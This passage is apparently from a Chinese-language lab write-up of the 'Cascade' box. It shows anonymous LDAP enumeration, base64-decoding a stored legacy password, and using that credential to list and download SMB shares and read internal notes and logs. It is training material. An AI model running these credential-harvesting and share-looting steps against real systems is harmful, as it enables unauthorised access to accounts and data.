+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Work/Kali/Cascade/Users<span style="color:#f92672">]</span>                                                                                                                                                       
+</span></span><span style="display:flex;"><span>└─$ ldapsearch -x -H ldap://10.129.26.199 -b <span style="color:#e6db74">&#34;dc=cascade,dc=local&#34;</span> <span style="color:#e6db74">&#34;(objectClass=user)&#34;</span> 
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Ryan Thompson, Users, UK, cascade.local                                                                                                                                                         </span>
+</span></span><span style="display:flex;"><span>dn: CN<span style="color:#f92672">=</span>Ryan Thompson,OU<span style="color:#f92672">=</span>Users,OU<span style="color:#f92672">=</span>UK,DC<span style="color:#f92672">=</span>cascade,DC<span style="color:#f92672">=</span>local                                                                                                                                           
+</span></span><span style="display:flex;"><span>objectClass: top                                                                                                                                                                                  
+</span></span><span style="display:flex;"><span>objectClass: person                                                                                                                                                                               
+</span></span><span style="display:flex;"><span>objectClass: organizationalPerson                                                                                                                                                                 
+</span></span><span style="display:flex;"><span>objectClass: user                                                                                                                                                                                 
+</span></span><span style="display:flex;"><span>cn: Ryan Thompson                                                                                                                                                                                 
+</span></span><span style="display:flex;"><span>sn: Thompson                                                                                                                                                                                      
+</span></span><span style="display:flex;"><span>givenName: Ryan                                                                                                                                                                                   
+</span></span><span style="display:flex;"><span>distinguishedName: CN<span style="color:#f92672">=</span>Ryan Thompson,OU<span style="color:#f92672">=</span>Users,OU<span style="color:#f92672">=</span>UK,DC<span style="color:#f92672">=</span>cascade,DC<span style="color:#f92672">=</span>local                                                                                                                            
+</span></span><span style="display:flex;"><span>instanceType: <span style="color:#ae81ff">4</span>                                                                                                                                                                                   
+</span></span><span style="display:flex;"><span>whenCreated: 20200109193126.0Z                                                                                                                                                                    
+</span></span><span style="display:flex;"><span>whenChanged: 20200323112031.0Z                                                                                                                                                                    
+</span></span><span style="display:flex;"><span>displayName: Ryan Thompson                                                                                                                                                                        
+</span></span><span style="display:flex;"><span>uSNCreated: <span style="color:#ae81ff">24610</span>                                                                                                                                                                                 
+</span></span><span style="display:flex;"><span>memberOf: CN<span style="color:#f92672">=</span>IT,OU<span style="color:#f92672">=</span>Groups,OU<span style="color:#f92672">=</span>UK,DC<span style="color:#f92672">=</span>cascade,DC<span style="color:#f92672">=</span>local                                                                                                                                               
+</span></span><span style="display:flex;"><span>uSNChanged: <span style="color:#ae81ff">295010</span>                                                                                                                                                                                
+</span></span><span style="display:flex;"><span>name: Ryan Thompson                                                                                                                                                                               
+</span></span><span style="display:flex;"><span>objectGUID:: LfpD6qngUkupEy9bFXBBjA<span style="color:#f92672">==</span>                                                                                                                                                             
+</span></span><span style="display:flex;"><span>userAccountControl: <span style="color:#ae81ff">66048</span>                                                                                                                                                                         
+</span></span><span style="display:flex;"><span>badPwdCount: <span style="color:#ae81ff">0</span>                                                                                                                                                                                    
+</span></span><span style="display:flex;"><span>codePage: <span style="color:#ae81ff">0</span>                                                                                                                                                                                       
+</span></span><span style="display:flex;"><span>countryCode: <span style="color:#ae81ff">0</span>                                                                                                                                                                                    
+</span></span><span style="display:flex;"><span>badPasswordTime: <span style="color:#ae81ff">132247339091081169</span>                                                                                                                                                               
+</span></span><span style="display:flex;"><span>lastLogoff: <span style="color:#ae81ff">0</span>                                                                                                                                                                                     
+</span></span><span style="display:flex;"><span>lastLogon: <span style="color:#ae81ff">132247339125713230</span>                                                                                                                                                                     
+</span></span><span style="display:flex;"><span>pwdLastSet: <span style="color:#ae81ff">132230718862636251</span>                                                                                                                                                                    
+</span></span><span style="display:flex;"><span>primaryGroupID: <span style="color:#ae81ff">513</span>                                                                                                                                                                               
+</span></span><span style="display:flex;"><span>objectSid:: AQUAAAAAAAUVAAAAMvuhxgsd8Uf1yHJFVQQAAA<span style="color:#f92672">==</span>                                                                                                                                              
+</span></span><span style="display:flex;"><span>accountExpires: <span style="color:#ae81ff">9223372036854775807</span>                                                                                                                                                               
+</span></span><span style="display:flex;"><span>logonCount: <span style="color:#ae81ff">2</span>                                                                                                                                                                                     
+</span></span><span style="display:flex;"><span>sAMAccountName: r.thompson                                                                                                                                                                        
+</span></span><span style="display:flex;"><span>sAMAccountType: <span style="color:#ae81ff">805306368</span>                                                                                                                                                                         
+</span></span><span style="display:flex;"><span>userPrincipalName: r.thompson@cascade.local                                                                                                                                                       
+</span></span><span style="display:flex;"><span>objectCategory: CN<span style="color:#f92672">=</span>Person,CN<span style="color:#f92672">=</span>Schema,CN<span style="color:#f92672">=</span>Configuration,DC<span style="color:#f92672">=</span>cascade,DC<span style="color:#f92672">=</span>local                                                                                                                          
+</span></span><span style="display:flex;"><span>dSCorePropagationData: 20200126183918.0Z                                                                                                                                                          
+</span></span><span style="display:flex;"><span>dSCorePropagationData: 20200119174753.0Z                                                                                                                                                          
+</span></span><span style="display:flex;"><span>dSCorePropagationData: 20200119174719.0Z                                                                                                                                                          
+</span></span><span style="display:flex;"><span>dSCorePropagationData: 20200119174508.0Z                                                                                                                                                          
+</span></span><span style="display:flex;"><span>dSCorePropagationData: 16010101000000.0Z                                                                                                                                                          
+</span></span><span style="display:flex;"><span>lastLogonTimestamp: <span style="color:#ae81ff">132294360317419816</span>                                                                                                                                                            
+</span></span><span style="display:flex;"><span>msDS-SupportedEncryptionTypes: <span style="color:#ae81ff">0</span>                                                                                                                                                                  
+</span></span><span style="display:flex;"><span>cascadeLegacyPwd: clk0bjVldmE<span style="color:#f92672">=</span> 
+</span></span></code></pre></div><p>可以发现 Ryan Thompson 有个值 cascadeLegacyPwd: clk0bjVldmE= ，像是 base64 加密的字符串，解密看看。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Work/Kali/Cascade/Users<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ echo <span style="color:#e6db74">&#34;clk0bjVldmE=&#34;</span> | base64 -d
+</span></span><span style="display:flex;"><span>rY4n5eva
+</span></span></code></pre></div><p>得到一个凭据。</p>
+<h2 id="smb-探索">SMB 探索</h2>
+<p>执行 SMB 扫描，发现一个自定义目录 Data。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Work/Kali/Cascade/Users<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ smbmap -H 10.129.26.199 -u r.thompson -p <span style="color:#e6db74">&#39;rY4n5eva&#39;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    ________  ___      ___  _______   ___      ___       __         _______
+</span></span><span style="display:flex;"><span>   /<span style="color:#e6db74">&#34;       )|&#34;</span>  <span style="color:#ae81ff">\ </span>   /<span style="color:#e6db74">&#34;  ||   _  &#34;</span><span style="color:#ae81ff">\ </span>|<span style="color:#e6db74">&#34;  \    /&#34;</span>  |     /<span style="color:#e6db74">&#34;&#34;</span><span style="color:#ae81ff">\ </span>      |   __ <span style="color:#e6db74">&#34;\
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  (:   \___/  \   \  //   |(. |_)  :) \   \  //   |    /    \      (. |__) :)
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">   \___  \    /\  \/.    ||:     \/   /\   \/.    |   /&#39; /\  \     |:  ____/
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    __/  \   |: \.        |(|  _  \  |: \.        |  //  __&#39;  \    (|  /
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">   /&#34;</span> <span style="color:#ae81ff">\ </span>  :<span style="color:#f92672">)</span> |.  <span style="color:#ae81ff">\ </span>   /:  <span style="color:#f92672">||</span>: |_<span style="color:#f92672">)</span>  :<span style="color:#f92672">)</span>|.  <span style="color:#ae81ff">\ </span>   /:  | /   /  <span style="color:#ae81ff">\ </span>  <span style="color:#ae81ff">\ </span> /|__/ <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>  <span style="color:#f92672">(</span>_______/  |___|<span style="color:#ae81ff">\_</span>_/|___|<span style="color:#f92672">(</span>_______/ |___|<span style="color:#ae81ff">\_</span>_/|___|<span style="color:#f92672">(</span>___/    <span style="color:#ae81ff">\_</span>__<span style="color:#f92672">)(</span>_______<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>-----------------------------------------------------------------------------
+</span></span><span style="display:flex;"><span>SMBMap - Samba Share Enumerator v1.10.7 | Shawn Evans - ShawnDEvans@gmail.com
+</span></span><span style="display:flex;"><span>                     https://github.com/ShawnDEvans/smbmap
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Detected <span style="color:#ae81ff">1</span> hosts serving SMB                                                                                                  
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Established <span style="color:#ae81ff">1</span> SMB connections<span style="color:#f92672">(</span>s<span style="color:#f92672">)</span> and <span style="color:#ae81ff">1</span> authenticated session<span style="color:#f92672">(</span>s<span style="color:#f92672">)</span>                                                      
+</span></span><span style="display:flex;"><span>                                                                                                                             
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> IP: 10.129.26.199:445       Name: cascade.local             Status: Authenticated
+</span></span><span style="display:flex;"><span>        Disk                                                    Permissions     Comment
+</span></span><span style="display:flex;"><span>        ----                                                    -----------     -------
+</span></span><span style="display:flex;"><span>        ADMIN$                                                  NO ACCESS       Remote Admin
+</span></span><span style="display:flex;"><span>        Audit$                                                  NO ACCESS       
+</span></span><span style="display:flex;"><span>        C$                                                      NO ACCESS       Default share
+</span></span><span style="display:flex;"><span>        Data                                                    READ ONLY       
+</span></span><span style="display:flex;"><span>        IPC$                                                    NO ACCESS       Remote IPC
+</span></span><span style="display:flex;"><span>        NETLOGON                                                READ ONLY       Logon server share 
+</span></span><span style="display:flex;"><span>        print$                                                  READ ONLY       Printer Drivers
+</span></span><span style="display:flex;"><span>        SYSVOL                                                  READ ONLY       Logon server share 
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Closed <span style="color:#ae81ff">1</span> connections 
+</span></span></code></pre></div><p>连接到 Data，将里面的文件下载下来。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Work/Kali/Cascade/SMB<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ smbclient //10.129.26.199/Data -U <span style="color:#e6db74">&#39;r.thompson%rY4n5eva&#39;</span> -W cascade.local
+</span></span><span style="display:flex;"><span>Try <span style="color:#e6db74">&#34;help&#34;</span> to get a list of possible commands.
+</span></span><span style="display:flex;"><span>smb: <span style="color:#ae81ff">\&gt;</span> recurse ON
+</span></span><span style="display:flex;"><span>smb: <span style="color:#ae81ff">\&gt;</span> prompt OFF
+</span></span><span style="display:flex;"><span>smb: <span style="color:#ae81ff">\&gt;</span> mget *
+</span></span><span style="display:flex;"><span>NT_STATUS_ACCESS_DENIED listing <span style="color:#ae81ff">\C</span>ontractors<span style="color:#ae81ff">\*</span>
+</span></span><span style="display:flex;"><span>NT_STATUS_ACCESS_DENIED listing <span style="color:#ae81ff">\F</span>inance<span style="color:#ae81ff">\*</span>
+</span></span><span style="display:flex;"><span>NT_STATUS_ACCESS_DENIED listing <span style="color:#ae81ff">\P</span>roduction<span style="color:#ae81ff">\*</span>
+</span></span><span style="display:flex;"><span>NT_STATUS_ACCESS_DENIED listing <span style="color:#ae81ff">\T</span>emps<span style="color:#ae81ff">\*</span>
+</span></span><span style="display:flex;"><span>getting file <span style="color:#ae81ff">\I</span>T<span style="color:#ae81ff">\E</span>mail Archives<span style="color:#ae81ff">\M</span>eeting_Notes_June_2018.html of size <span style="color:#ae81ff">2522</span> as IT/Email Archives/Meeting_Notes_June_2018.html <span style="color:#f92672">(</span>5.2 KiloBytes/sec<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>average 5.2 KiloBytes/sec<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>getting file <span style="color:#ae81ff">\I</span>T<span style="color:#ae81ff">\L</span>ogs<span style="color:#ae81ff">\A</span>rk AD Recycle Bin<span style="color:#ae81ff">\A</span>rkAdRecycleBin.log of size <span style="color:#ae81ff">1303</span> as IT/Logs/Ark AD Recycle Bin/ArkAdRecycleBin.log <span style="color:#f92672">(</span>2.7 KiloBytes/sec<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>average 3.9 KiloBytes/sec<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>getting file <span style="color:#ae81ff">\I</span>T<span style="color:#ae81ff">\L</span>ogs<span style="color:#ae81ff">\D</span>Cs<span style="color:#ae81ff">\d</span>cdiag.log of size <span style="color:#ae81ff">5967</span> as IT/Logs/DCs/dcdiag.log <span style="color:#f92672">(</span>12.1 KiloBytes/sec<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>average 6.7 KiloBytes/sec<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>getting file <span style="color:#ae81ff">\I</span>T<span style="color:#ae81ff">\T</span>emp<span style="color:#ae81ff">\s</span>.smith<span style="color:#ae81ff">\V</span>NC Install.reg of size <span style="color:#ae81ff">2680</span> as IT/Temp/s.smith/VNC Install.reg <span style="color:#f92672">(</span>5.1 KiloBytes/sec<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>average 6.3 KiloBytes/sec<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>smb: <span style="color:#ae81ff">\&gt;</span> ^C
+</span></span><span style="display:flex;"><span>                                                                                                                                                                                                  
+</span></span><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Work/Kali/Cascade/SMB<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ ls                                                                                 
+</span></span><span style="display:flex;"><span>Contractors  Finance  IT  Production  Temps
+</span></span><span style="display:flex;"><span>                                                                                                                                                                                                  
+</span></span><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Work/Kali/Cascade/SMB<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ tree           
+</span></span><span style="display:flex;"><span>.
+</span></span><span style="display:flex;"><span>├── Contractors
+</span></span><span style="display:flex;"><span>├── Finance
+</span></span><span style="display:flex;"><span>├── IT
+</span></span><span style="display:flex;"><span>│   ├── Email Archives
+</span></span><span style="display:flex;"><span>│   │   └── Meeting_Notes_June_2018.html
+</span></span><span style="display:flex;"><span>│   ├── LogonAudit
+</span></span><span style="display:flex;"><span>│   ├── Logs
+</span></span><span style="display:flex;"><span>│   │   ├── Ark AD Recycle Bin
+</span></span><span style="display:flex;"><span>│   │   │   └── ArkAdRecycleBin.log
+</span></span><span style="display:flex;"><span>│   │   └── DCs
+</span></span><span style="display:flex;"><span>│   │       └── dcdiag.log
+</span></span><span style="display:flex;"><span>│   └── Temp
+</span></span><span style="display:flex;"><span>│       ├── r.thompson
+</span></span><span style="display:flex;"><span>│       └── s.smith
+</span></span><span style="display:flex;"><span>│           └── VNC Install.reg
+</span></span><span style="display:flex;"><span>├── Production
+</span></span><span style="display:flex;"><span>└── Temps
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">14</span> directories, <span style="color:#ae81ff">4</span> files
+</span></span></code></pre></div><p>审计一下。</p>
+<p>有一个临时账号 TempAdmin，密码和正常 admin 密码一样，2018 年底会删除。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Work/Kali/Cascade/SMB<span style="color:#f92672">]</span>                      
+</span></span><span style="display:flex;"><span>└─$ cat IT/Email<span style="color:#ae81ff">\ </span>Archives/Meeting_Notes_June_2018.html                                                                       
+</span></span><span style="display:flex;"><span>&lt;html&gt;                                                                                                                        
+</span></span><span style="display:flex;"><span>&lt;body lang<span style="color:#f92672">=</span>EN-GB link<span style="color:#f92672">=</span>blue vlink<span style="color:#f92672">=</span>purple style<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;tab-interval:36.0pt&#39;</span>&gt;                                                                        
+</span></span><span style="display:flex;"><span>                                                                                                                                            
+</span></span><span style="display:flex;"><span>&lt;div class<span style="color:#f92672">=</span>WordSection1&gt;                                                                                                                    
+</span></span><span style="display:flex;"><span>                                                                                                                                            
+</span></span><span style="display:flex;"><span>&lt;p class<span style="color:#f92672">=</span>MsoNormal style<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;margin-left:120.0pt;text-indent:-120.0pt;tab-stops:
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">120.0pt;mso-layout-grid-align:none;text-autospace:none&#39;</span>&gt;&lt;b&gt;&lt;span                                                                            
+</span></span><span style="display:flex;"><span>style<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;mso-bidi-font-family:Calibri;color:black&#39;</span>&gt;From:&lt;span style<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;mso-tab-count:                                                                             
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">1&#39;</span>&gt;���������������������������������������� &lt;/span&gt;&lt;/span&gt;&lt;/b&gt;&lt;span                                                                                           
+</span></span><span style="display:flex;"><span>style<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;mso-bidi-font-family:Calibri;color:black&#39;</span>&gt;Steve Smith                                                                                
+</span></span><span style="display:flex;"><span>&lt;o:p&gt;&lt;/o:p&gt;&lt;/span&gt;&lt;/p&gt;                                                                                                                      
+</span></span><span style="display:flex;"><span>                                                                      
+</span></span><span style="display:flex;"><span>&lt;p class<span style="color:#f92672">=</span>MsoNormal style<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;margin-left:120.0pt;text-indent:-120.0pt;tab-stops:
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">120.0pt;mso-layout-grid-align:none;text-autospace:none&#39;</span>&gt;&lt;b&gt;&lt;span
+</span></span><span style="display:flex;"><span>style<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;mso-bidi-font-family:Calibri;color:black&#39;</span>&gt;To:&lt;span style<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;mso-tab-count:
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">1&#39;</span>&gt;���������������������������������������������� &lt;/span&gt;&lt;/span&gt;&lt;/b&gt;&lt;span
+</span></span><span style="display:flex;"><span>style<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;mso-bidi-font-family:Calibri;color:black&#39;</span>&gt;IT <span style="color:#f92672">(</span>Internal<span style="color:#f92672">)</span>&lt;o:p&gt;&lt;/o:p&gt;&lt;/span&gt;&lt;/p&gt;                                                                          
+</span></span><span style="display:flex;"><span>                                                                      
+</span></span><span style="display:flex;"><span>&lt;p class<span style="color:#f92672">=</span>MsoNormal style<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;margin-left:120.0pt;text-indent:-120.0pt;tab-stops:
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">120.0pt;mso-layout-grid-align:none;text-autospace:none&#39;</span>&gt;&lt;b&gt;&lt;span      
+</span></span><span style="display:flex;"><span>style<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;mso-bidi-font-family:Calibri;color:black&#39;</span>&gt;Sent:&lt;span style<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;mso-tab-count:                                                                             
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">1&#39;</span>&gt;������������������������������������������ &lt;/span&gt;&lt;/span&gt;&lt;/b&gt;&lt;span
+</span></span><span style="display:flex;"><span>style<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;mso-bidi-font-family:Calibri;color:black&#39;</span>&gt;14 June <span style="color:#ae81ff">2018</span> 14:07&lt;o:p&gt;&lt;/o:p&gt;&lt;/span&gt;&lt;/p&gt;                                                                     
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>                                                                               
+</span></span><span style="display:flex;"><span>&lt;p class<span style="color:#f92672">=</span>MsoNormal style<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;margin-left:120.0pt;text-indent:-120.0pt;tab-stops:  
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">120.0pt;mso-layout-grid-align:none;text-autospace:none&#39;</span>&gt;&lt;b&gt;&lt;span               
+</span></span><span style="display:flex;"><span>style<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;mso-bidi-font-family:Calibri;color:black&#39;</span>&gt;Subject:&lt;span
+</span></span><span style="display:flex;"><span>style<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;mso-tab-count:1&#39;</span>&gt;������������������������������������ &lt;/span&gt;&lt;/span&gt;&lt;/b&gt;&lt;span                                                                          
+</span></span><span style="display:flex;"><span>style<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;mso-bidi-font-family:Calibri;color:black&#39;</span>&gt;Meeting Notes&lt;o:p&gt;&lt;/o:p&gt;&lt;/span&gt;&lt;/p&gt;                                                                          
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>&lt;p&gt;&lt;o:p&gt;&amp;nbsp;&lt;/o:p&gt;&lt;/p&gt;                                                       
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>&lt;p&gt;For anyone that missed yesterday�s meeting <span style="color:#f92672">(</span>I�m looking at
+</span></span><span style="display:flex;"><span>you Ben<span style="color:#f92672">)</span>. Main points are below:&lt;/p&gt;                                           
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>&lt;p class<span style="color:#f92672">=</span>MsoNormal&gt;&lt;o:p&gt;&amp;nbsp;&lt;/o:p&gt;&lt;/p&gt;                                       
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>&lt;p&gt;-- New production network will be going live on
+</span></span><span style="display:flex;"><span>Wednesday so keep an eye out <span style="color:#66d9ef">for</span> any issues. &lt;/p&gt;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>&lt;p&gt;-- We will be using a temporary account to                                  
+</span></span><span style="display:flex;"><span>perform all tasks related to the network migration and this account will be deleted at the end of
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">2018</span> once the migration is complete. This will allow us to identify actions
+</span></span><span style="display:flex;"><span>related to the migration in security logs etc. Username is TempAdmin <span style="color:#f92672">(</span>password is the same as the normal admin account password<span style="color:#f92672">)</span>. &lt;/p&gt;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>&lt;p&gt;-- The winner of the �Best GPO� competition will be
+</span></span><span style="display:flex;"><span>announced on Friday so get your submissions in soon.&lt;/p&gt;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>&lt;p class<span style="color:#f92672">=</span>MsoNormal&gt;&lt;o:p&gt;&amp;nbsp;&lt;/o:p&gt;&lt;/p&gt;                                       
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>&lt;p class<span style="color:#f92672">=</span>MsoNormal&gt;Steve&lt;/p&gt;                                                   
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>&lt;/div&gt;                                                                         
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>&lt;/body&gt;                                                                        
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>&lt;/html&gt; 
+</span></span></code></pre></div><p>在 8/12/2018 把 TempAdmin 移进了 回收站，但 cascadeLegacyPwd 还在回收站，能被回收站权限账号读取到。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Work/Kali/Cascade/SMB<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ cat IT/Logs/Ark<span style="color:#ae81ff">\ </span>AD<span style="color:#ae81ff">\ </span>Recycle<span style="color:#ae81ff">\ </span>Bin/ArkAdRecycleBin.log 
+</span></span><span style="display:flex;"><span>1/10/2018 15:43 <span style="color:#f92672">[</span>MAIN_THREAD<span style="color:#f92672">]</span>   ** STARTING - ARK AD RECYCLE BIN MANAGER v1.2.2 **
+</span></span><span style="display:flex;"><span>1/10/2018 15:43 <span style="color:#f92672">[</span>MAIN_THREAD<span style="color:#f92672">]</span>   Validating settings...
+</span></span><span style="display:flex;"><span>1/10/2018 15:43 <span style="color:#f92672">[</span>MAIN_THREAD<span style="color:#f92672">]</span>   Error: Access is denied
+</span></span><span style="display:flex;"><span>1/10/2018 15:43 <span style="color:#f92672">[</span>MAIN_THREAD<span style="color:#f92672">]</span>   Exiting with error code <span style="color:#ae81ff">5</span>
+</span></span><span style="display:flex;"><span>2/10/2018 15:56 <span style="color:#f92672">[</span>MAIN_THREAD<span style="color:#f92672">]</span>   ** STARTING - ARK AD RECYCLE BIN MANAGER v1.2.2 **
+</span></span><span style="display:flex;"><span>2/10/2018 15:56 <span style="color:#f92672">[</span>MAIN_THREAD<span style="color:#f92672">]</span>   Validating settings...
+</span></span><span style="display:flex;"><span>2/10/2018 15:56 <span style="color:#f92672">[</span>MAIN_THREAD<span style="color:#f92672">]</span>   Running as user CASCADE<span style="color:#ae81ff">\A</span>rkSvc
+</span></span><span style="display:flex;"><span>2/10/2018 15:56 <span style="color:#f92672">[</span>MAIN_THREAD<span style="color:#f92672">]</span>   Moving object to AD recycle bin CN<span style="color:#f92672">=</span>Test,OU<span style="color:#f92672">=</span>Users,OU<span style="color:#f92672">=</span>UK,DC<span style="color:#f92672">=</span>cascade,DC<span style="color:#f92672">=</span>local
+</span></span><span style="display:flex;"><span>2/10/2018 15:56 <span style="color:#f92672">[</span>MAIN_THREAD<span style="color:#f92672">]</span>   Successfully moved object. New location CN<span style="color:#f92672">=</span>Test<span style="color:#ae81ff">\0</span>ADEL:ab073fb7-6d91-4fd1-b877-817b9e1b0e6d,CN<span style="color:#f92672">=</span>Deleted Objects,DC<span style="color:#f92672">=</span>cascade,DC<span style="color:#f92672">=</span>local
+</span></span><span style="display:flex;"><span>2/10/2018 15:56 <span style="color:#f92672">[</span>MAIN_THREAD<span style="color:#f92672">]</span>   Exiting with error code <span style="color:#ae81ff">0</span>       
+</span></span><span style="display:flex;"><span>8/12/2018 12:22 <span style="color:#f92672">[</span>MAIN_THREAD<span style="color:#f92672">]</span>   ** STARTING - ARK AD RECYCLE BIN MANAGER v1.2.2 **
+</span></span><span style="display:flex;"><span>8/12/2018 12:22 <span style="color:#f92672">[</span>MAIN_THREAD<span style="color:#f92672">]</span>   Validating settings...
+</span></span><span style="display:flex;"><span>8/12/2018 12:22 <span style="color:#f92672">[</span>MAIN_THREAD<span style="color:#f92672">]</span>   Running as user CASCADE<span style="color:#ae81ff">\A</span>rkSvc
+</span></span><span style="display:flex;"><span>8/12/2018 12:22 <span style="color:#f92672">[</span>MAIN_THREAD<span style="color:#f92672">]</span>   Moving object to AD recycle bin CN<span style="color:#f92672">=</span>TempAdmin,OU<span style="color:#f92672">=</span>Users,OU<span style="color:#f92672">=</span>UK,DC<span style="color:#f92672">=</span>cascade,DC<span style="color:#f92672">=</span>local
+</span></span><span style="display:flex;"><span>8/12/2018 12:22 <span style="color:#f92672">[</span>MAIN_THREAD<span style="color:#f92672">]</span>   Successfully moved object. New location CN<span style="color:#f92672">=</span>TempAdmin<span style="color:#ae81ff">\0</span>ADEL:f0cc344d-31e0-4866-bceb-a842791ca059,CN<span style="color:#f92672">=</span>Deleted Objects,DC<span style="color:#f92672">=</span>cascade,DC<span style="color:#f92672">=</span>local
+</span></span><span style="display:flex;"><span>8/12/2018 12:22 <span style="color:#f92672">[</span>MAIN_THREAD<span style="color:#f92672">]</span>   Exiting with error code <span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span>                                                          
+</span></span></code></pre></div><p>无有价值信息。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Work/Kali/Cascade/SMB<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ cat IT/Logs/DCs/dcdiag.log                           
